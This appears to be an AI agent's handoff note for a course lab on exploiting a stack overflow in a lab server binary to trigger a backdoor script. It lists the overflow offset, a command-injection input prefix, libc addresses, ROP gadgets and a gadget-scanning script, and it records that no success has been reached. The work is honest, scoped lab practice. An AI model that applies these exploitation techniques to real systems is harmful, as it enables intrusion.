# HANDOFF_PHASE2

Date: 2026-05-13
Updated: 2026-05-14
Repo: `/home/jnclaw/every_on_git_jnclaw/phd-life-system/nycu_network_security_practice_114-2`
Scope: state compression for the next Codex/GPT-5.5 handoff.

Primary paired validation log:
`projects/project-ii-apt-agent/project2-agent-scaffold/docs/PHASE2_SUCCESS_VALIDATION.md`.

Latest deep attempt:
`projects/project-ii-apt-agent/project2-agent-scaffold/docs/PHASE2_COMPLETION_ATTEMPT_2026-05-14.md`.

Evidence standard:

- `FACT` means verified in this handoff pass from local files, Docker state, binary tools, or coredump evidence.
- `REPORTED-UNVERIFIED` means prior-context/user-request material that was not independently verified from local artifacts in this pass.
- `THEORY` means the current best working hypothesis, not a success claim.

## 1. Mission Objective

Goal:
Trigger the official IC Phase II success condition.

Expected success artifact:

```text
/shared/success.txt
```

Rules:

- Must use the official IC workflow.
- No grader bypass.
- No manual `/backdoor` invocation.
- Do not create `/shared/success.txt` from the EC.
- Must exploit `blogic` legitimately through the course Phase II loop.

Non-goal:
Do not claim completion until `/shared/success.txt` is produced by IC-side `/backdoor` execution.

Current direct status:
Project II / Phase II is still not full-credit complete. The 2026-05-14 pass
added a verified x86_64 Colima IC setup, reproduced the baseline non-success,
confirmed NX blocks direct stack shellcode, and preserved the one-shot text
sweep harness. It did not observe `/shared/success.txt`.

## 2. Verified Facts

### Lab Workflow

- `projects/project-ii-apt-agent/lab.zip` contains:
  - `lab/docker.sh`
  - `lab/grader.sh`
  - `lab/IC/backdoor`
  - `lab/IC/runserver.sh`
  - `lab/IC/server_1`
  - `lab/IC/server_2`
  - `lab/shared/blogic`
  - `lab/shared/config.data`
  - `lab/shared/coredump/`
- `docker.sh 2` selects `server_2`, creates container `IC_PHASE2`, copies `server_2` to `/blogic` and `/shared/blogic`, copies `/backdoor` and `/runserver.sh`, sets executable bits inside the container, sets `kernel.randomize_va_space=0`, then starts `/runserver.sh`.
- Live container verified:
  - Name: `IC_PHASE2`
  - Image: `ic_image`
  - Privileged: `true`
  - Mount: `/tmp/p2lab2/lab/shared -> /shared`
  - Ubuntu userland: Ubuntu 24.04
  - glibc: `ldd (Ubuntu GLIBC 2.39-0ubuntu8.7) 2.39`
  - ASLR: `/proc/sys/kernel/randomize_va_space` is `0`
- `/runserver.sh` sets core dumps to `/shared/coredump/%e-%p.core`, enables `ulimit -c unlimited`, then loops `/blogic`.
- `grader.sh` clears `/shared/coredump/*`, `/shared/config.data`, `/shared/exploit_done`, and `/shared/success.txt`, then repeatedly runs `/exploit`, waits for IC to consume `/shared/exploit_done`, checks `/shared/success.txt`, and runs `/triage` if no success.

### Success Path

- `/backdoor` is a shell script:

```sh
echo "Backdoor triggered" > /shared/success.txt
date >> /shared/success.txt
```

- Therefore `/shared/success.txt` is the official artifact, but EC-side file creation is a grading bypass.

### Binary Facts

- Live `/blogic` SHA-256 equals extracted `lab/IC/server_2`:

```text
155fee01eb0e2a88e9f19738b7bd92bd25306a387247047ca525a2ff7cf8304c
```

- Extracted `lab/shared/blogic` in the zip is not the live Phase II binary; `docker.sh 2` overwrites `/shared/blogic` with `server_2`.
- `server_2` is ELF64, dynamically linked, non-PIE (`Type: EXEC`), not stripped.
- NX is enabled: `GNU_STACK` is `RW`, not executable.
- No stack canary import was found: no `__stack_chk_fail` symbol.
- Partial RELRO: `GNU_RELRO` exists, no `BIND_NOW` flag found.
- Imported functions include `sprintf`, `strcpy`, `snprintf`, and `system`.
- `parse_config()` reads `/shared/config.data`, looks for key `user_input`, and copies the value with unbounded `strcpy` into global `.bss` `user_input`.
- `main()` waits for `/shared/exploit_done`, unlinks it, then calls `parse_config()` and `run_server()`.
- `run_server()` passes global `user_input` to `log_message()`.
- `log_message()` allocates a `0x60` stack buffer and calls:

```text
sprintf(local_buffer, "[LOG]: %s", user_input)
```

- The format prefix length is `7`, so saved RIP starts after `0x60 + 8 - 7 = 97` user-controlled bytes.
- A coredump confirmed control-flow corruption:
  - Core: `/shared/coredump/blogic-45.core`
  - Signal: `SIGSEGV`
  - Crash at `0x40146f`, the `ret` in `log_message`
  - `rbp = 0x4242424242424242`
  - stack return chain begins with repeated `0x4242424242424242`
- This confirms stack overflow and saved return-address overwrite are reachable.

### Current Live Shared State

- Treat `/tmp/p2lab2/lab/shared` as volatile runtime state. Re-check before
  acting; do not assume it still represents the latest official validation
  attempt.
- Current live shared directory: `/tmp/p2lab2/lab/shared`
- Current coredump exists: `/tmp/p2lab2/lab/shared/coredump/blogic-45.core`
- Current `/shared/success.txt` does not exist.
- Current live `config.data` is `214` bytes, SHA-256:

```text
b0b0bc877e24d78818d1d83890576e6e1ab03021dd67b47588b8bff45853859f
```

- Current live `config.data` begins with:

```text
user_input=JNCLAWCMD_/backdoor_#_BBBB...
```

- `triage_state.json` does not match that live `config.data`; it records an earlier `112` byte `phase2-medium-control-flow-probe` candidate. Do not trust `triage_state.json` alone as the latest input source.
- The paired validation log records a later explicit ret-to-maintenance
  validation pass where IC consumed `/shared/exploit_done`, no
  `/shared/success.txt` appeared, and no EC-side fake success file was created.

### libc Facts

- Exact libc was copied from `IC_PHASE2:/lib/x86_64-linux-gnu/libc.so.6`.
- libc SHA-256:

```text
d8db8739a1633c972cec6a4fe0566bdcec6fd088f98723492ab0361f66238f75
```

- libc BuildID:

```text
8e9fd827446c24067541ac5390e6f527fb5947bb
```

- Live current libc base from `/proc/<blogic-pid>/maps`:

```text
0x7ffff7afb000
```

- `system` offset:

```text
0x58750
```

- `"/bin/sh"` offset:

```text
0x1cb42f
```

- Current-runtime absolute addresses, assuming the same container mapping:
  - `system = 0x7ffff7b53750`
  - `"/bin/sh" = 0x7ffff7cc642f`
- Simple executable-segment byte scan found libc gadgets:
  - `pop rdi; ret`: offsets `0x10f78b`, `0x110dc9`, `0x110fe7`, `0x111cbe`, `0x112559`, `0x114a19`, `0x1157cc`
  - `pop rsi; ret`: offsets `0x110a7d`, `0x110bac`, `0x110cf6`, `0x125dc1`, `0x1261b1`
  - `syscall; ret`: offsets include `0x98fb6`, `0x98fd5`, `0xa5829`, `0xf4749`
- The main binary byte scan found no `pop rdi; ret`.

## 3. Important Symbols

### server_2 / live blogic

```text
log_message(char const*)      = 0x401416
maintenance_task(char const*) = 0x401470
maintenance_task+5            = 0x401475
parse_config()                = 0x4014bc
run_server()                  = 0x401688
file_exists(char const*)      = 0x4016cd
main                          = 0x4016f5
user_input (.bss)             = 0x404340
```

Useful binary `ret` gadgets found by byte scan:

```text
0x40101a
0x401364
0x401390
0x4013d0
0x4013fe
0x401400
0x40146f
0x4014bb
0x401687
0x4016cc
0x4016f4
0x4017f6
```

Important strings:

```text
0x402008 = "[LOG]: %s"
0x402012 = "echo '%s' >> /tmp/server.log"
0x40202f = "/shared/config.data"
0x402043 = "user_input"
0x402064 = "/shared/exploit_done"
```

### Current libc

Offsets:

```text
system        = 0x58750
"/bin/sh"     = 0x1cb42f
pop rdi; ret  = 0x10f78b  # first byte-scan hit
pop rsi; ret  = 0x110a7d  # first byte-scan hit
syscall; ret  = 0x98fb6   # first byte-scan hit
```

Current absolute addresses with base `0x7ffff7afb000`:

```text
system        = 0x7ffff7b53750
"/bin/sh"     = 0x7ffff7cc642f
pop rdi; ret  = 0x7ffff7c0a78b
pop rsi; ret  = 0x7ffff7c0ba7d
syscall; ret  = 0x7ffff7b93fb6
```

Re-check libc base if the container is restarted.

## 4. What Was Already Tried / Explored

### FACT: verified from current repo/runtime artifacts

- Default scaffold placeholder path exists. It is not an exploit and is not a success claim.
- `PROJECT2_ENABLE_PHASE2_PROBE=1` enables `src/phase2_payload.py`.
- Current source-level Phase II probe:
  - writes a byte-exact `user_input=` line;
  - currently uses the lab-only shell-shaping prefix `'; /backdoor; #`;
  - pads to return offset `97`;
  - appends the low three bytes of `0x401475` (`maintenance_task+5`);
  - records status `ret-to-maintenance-probe-not-success-claim`;
  - has not produced `/shared/success.txt`.
- The paired validation log records that direct ret-to-`maintenance_task+5`
  was not sufficient: by `log_message` return time, `rdi` pointed at a glibc
  stdout-lock area with zero bytes rather than controlled `user_input`, so the
  maintenance path behaved like an empty echo instead of the intended command.
- The paired validation log also records a bounded sweep over observed
  instruction-start addresses in `server_2`; it did not produce
  `/shared/success.txt`.
- A later/current live `B` smash input produced a real coredump and no success.
- The 2026-05-14 pass extended this evidence with a reusable harness at
  `projects/project-ii-apt-agent/project2-agent-scaffold/scripts/run_phase2_one_shot_sweep.py`.
  The full run tried `10328` one-shot candidates over `0x401000..0x401a20`
  with four prefixes and found no `/shared/success.txt`.
- Binary gadget search did not find `pop rdi; ret` in `server_2`.
- libc has `pop rdi; ret` gadgets, but using them requires solving the C-string/NUL-byte and pivot/control constraints.

### REPORTED-UNVERIFIED: do not treat as verified facts without logs

These were mentioned in the handoff request as already explored or likely dead-end categories, but this pass did not find local evidence logs for each one:

- direct stack shellcode
- simple RET smash
- naive ret2libc chain
- one_gadget attempts
- writable pivot gadget search

Avoid spending time redoing these from scratch unless a specific next step depends on one of them.

## 5. Current Leading Hypothesis

THEORY:

The main blocker is no longer finding the overflow. The blocker is reliable control-flow pivot plus first-argument control under the input path constraints.

Key constraints:

- Input reaches the overflow through C-string handling: `std::getline` -> `strcpy` -> `sprintf`.
- Embedded NUL bytes terminate the copied string, so naive full 64-bit address writes are constrained.
- NX is enabled, so direct stack shellcode is not the natural route.
- The main binary has poor ROP gadget quality and no `pop rdi; ret`.
- ASLR is disabled and libc base is stable inside the current container, so libc gadgets are attractive once the pivot/argument problem is solved.

Most plausible directions:

1. Treat direct partial return to `maintenance_task+5` as explored and
   insufficient unless new evidence shows `rdi` control.
2. Focus on a control-flow target or pivot that also controls the first
   argument, not only RIP.
3. If staying in the main binary is not enough, move to a ret2libc/libc-gadget
   route only after solving a reliable pivot or argument setup that works
   despite NUL-byte constraints.

Current non-fact:

- "ret2libc will solve it" is not yet proven. It is plausible because ASLR is off and libc has gadgets, but the NUL-byte and pivot constraints are unresolved.

## 6. Exact Environment Reproduction

From a clean extraction:

```sh
mkdir -p /tmp/p2lab2
unzip -oq /home/jnclaw/every_on_git_jnclaw/phd-life-system/nycu_network_security_practice_114-2/projects/project-ii-apt-agent/lab.zip -d /tmp/p2lab2
cd /tmp/p2lab2/lab
chmod +x docker.sh grader.sh
docker build -t ic_image IC
./docker.sh 2
```

Important notes:

- The zip extracted with host mode `664` in this pass, so `chmod +x docker.sh grader.sh` was needed for direct host execution.
- `docker.sh 2` already runs these inside the container:

```sh
chmod +x /blogic /runserver.sh /backdoor
sysctl -w kernel.randomize_va_space=0
docker exec -d IC_PHASE2 /runserver.sh
```

- Do not start another `/runserver.sh` loop unless the previous one is stopped; `docker.sh` starts it.
- Live verified process list included `/bin/bash /runserver.sh` and `/blogic`.

For the scaffold source tree:

```sh
cd /home/jnclaw/every_on_git_jnclaw/phd-life-system/nycu_network_security_practice_114-2/projects/project-ii-apt-agent/project2-agent-scaffold
PROJECT2_SHARED_DIR=/tmp/p2lab2/lab/shared PROJECT2_ENABLE_PHASE2_PROBE=1 python3 -m src.exploit_runner
```

## 7. Exact Commands Already Useful

Extract and identify the lab:

```sh
rm -rf /tmp/phase2_lab_verify
mkdir -p /tmp/phase2_lab_verify
unzip -oq projects/project-ii-apt-agent/lab.zip -d /tmp/phase2_lab_verify
file /tmp/phase2_lab_verify/lab/IC/server_2 /tmp/phase2_lab_verify/lab/IC/backdoor
sha256sum /tmp/phase2_lab_verify/lab/IC/server_2
```

Check mitigations:

```sh
readelf -h /tmp/phase2_lab_verify/lab/IC/server_2
readelf -lW /tmp/phase2_lab_verify/lab/IC/server_2 | rg 'GNU_STACK|GNU_RELRO|LOAD'
readelf -dW /tmp/phase2_lab_verify/lab/IC/server_2 | rg 'BIND_NOW|FLAGS' || true
readelf -sW /tmp/phase2_lab_verify/lab/IC/server_2 | rg '__stack_chk_fail|sprintf@|strcpy@|system@|snprintf@' || true
```

Find symbols:

```sh
nm -an /tmp/phase2_lab_verify/lab/IC/server_2 | c++filt | rg 'log_message|maintenance_task|parse_config|run_server|file_exists| main$|user_input'
objdump -d -Mintel --start-address=0x401416 --stop-address=0x401470 /tmp/phase2_lab_verify/lab/IC/server_2
objdump -d -Mintel --start-address=0x401470 --stop-address=0x4014bc /tmp/phase2_lab_verify/lab/IC/server_2
objdump -s -j .rodata /tmp/phase2_lab_verify/lab/IC/server_2 | sed -n '1,80p'
```

Check live container:

```sh
docker ps --format '{{.Names}} {{.Image}} {{.Status}}'
docker inspect IC_PHASE2 --format 'Name={{.Name}} Image={{.Config.Image}} Privileged={{.HostConfig.Privileged}} Mounts={{range .Mounts}}{{.Source}}->{{.Destination}} {{end}}'
docker exec IC_PHASE2 /bin/bash -lc 'ldd --version | head -n1; cat /proc/sys/kernel/randomize_va_space; ls -l /blogic /runserver.sh /backdoor /shared /shared/coredump; ps aux | sed -n "1,20p"'
```

Analyze the current core:

```sh
docker cp IC_PHASE2:/shared/coredump/blogic-45.core /tmp/phase2_lab_verify/blogic-45.core
gdb -q --batch \
  -ex 'set debuginfod enabled off' \
  -ex 'file /tmp/phase2_lab_verify/lab/IC/server_2' \
  -ex 'core /tmp/phase2_lab_verify/blogic-45.core' \
  -ex 'info reg rip rsp rbp rdi rsi rdx' \
  -ex 'bt' \
  -ex 'x/12gx $rsp' \
  -ex 'x/32bx $rsp'
```

Extract current libc and offsets:

```sh
docker cp IC_PHASE2:/lib/x86_64-linux-gnu/libc.so.6 /tmp/phase2_lab_verify/libc.so.6
readelf -sW /tmp/phase2_lab_verify/libc.so.6 | awk '$8 ~ /^system@@/ {print}'
grep -aob '/bin/sh' /tmp/phase2_lab_verify/libc.so.6 | head -n3
sha256sum /tmp/phase2_lab_verify/libc.so.6
```

Quick gadget byte scan:

```sh
python3 - <<'PY'
from pathlib import Path

for path, lo, hi in [
    (Path('/tmp/phase2_lab_verify/lab/IC/server_2'), 0x401000, 0x402000),
]:
    b = path.read_bytes()
    print(path)
    for pat, name in [(b'\x5f\xc3', 'pop rdi; ret'), (b'\xc3', 'ret')]:
        hits = []
        start = 0
        while True:
            i = b.find(pat, start)
            if i < 0:
                break
            va = 0x400000 + i
            if lo <= va < hi:
                hits.append(va)
            start = i + 1
        print(name, len(hits), [hex(x) for x in hits[:20]])

b = Path('/tmp/phase2_lab_verify/libc.so.6').read_bytes()
for pat, name in [(b'\x5f\xc3', 'pop rdi; ret'), (b'\x5e\xc3', 'pop rsi; ret'), (b'\x0f\x05\xc3', 'syscall; ret')]:
    hits = []
    start = 0
    while True:
        i = b.find(pat, start)
        if i < 0:
            break
        if 0x28000 <= i < 0x1b0000:
            hits.append(i)
        start = i + 1
    print(name, len(hits), [hex(x) for x in hits[:12]])
PY
```

## 8. FACT vs THEORY

### FACT

- Official success artifact is `/shared/success.txt`.
- `/backdoor` writes `/shared/success.txt`.
- Direct `/backdoor` execution is invalid for grading.
- `server_2` is the live Phase II `/blogic` in `IC_PHASE2`.
- Binary is ELF64, non-PIE, NX, no canary, partial RELRO.
- ASLR is disabled inside the live Phase II container.
- Vulnerable flow is `/shared/config.data` -> `user_input` -> `log_message()`.
- `log_message()` overflows a stack buffer via `sprintf`.
- Saved RIP overwrite begins at 97 `user_input` bytes.
- A coredump confirms saved control data corruption with `0x42`.
- libc `system` offset is `0x58750`.
- libc `"/bin/sh"` offset is `0x1cb42f`.
- Main binary has no byte-scan `pop rdi; ret`.
- Current live shared state has coredump evidence and no success.
- The ret-to-`maintenance_task+5` candidate did not produce official IC-side
  success in the recorded validation pass.

### THEORY

- The likely route is controlled ret/pivot under C-string constraints, then
  either reuse a main-binary path with proven first-argument control or use libc
  gadgets after solving pivot/argument setup.
- `maintenance_task+5 = 0x401475` is reachable by partial overwrite, but the
  recorded direct attempt did not control `rdi`; do not treat it as solved.
- libc ROP is plausible because ASLR is off and libc gadgets exist, but naive full-address writes are constrained by NUL bytes.

### DO NOT TREAT AS FACT

- Do not assume the current `triage_state.json` describes the latest `config.data`; it currently does not.
- Do not assume the current Phase II probe is a valid exploit; it is explicitly marked not a success claim.
- Do not assume ret2libc is solved merely because libc offsets are known.
- Do not assume direct shellcode is viable; NX is enabled.

## 9. Next Step For The Next Agent

Do NOT restart from scratch.

Continue from verified state only.

Avoid repeating previous dead-end explorations.

Recommended immediate next steps:

1. Re-check live container drift with `docker ps`, `/proc/sys/kernel/randomize_va_space`, `/proc/<blogic-pid>/maps`, and current `/shared/config.data`.
2. Keep `/backdoor` untouched and never invoke it manually.
3. Read `docs/PHASE2_SUCCESS_VALIDATION.md` before trying another candidate.
4. Focus on reliable pivot/argument-control that survives `strcpy`/`sprintf`
   NUL-byte constraints; do not repeat direct ret-to-`maintenance_task+5` as if
   untested.
5. Only after IC-side `/shared/success.txt` appears, update completion evidence and final packaging.
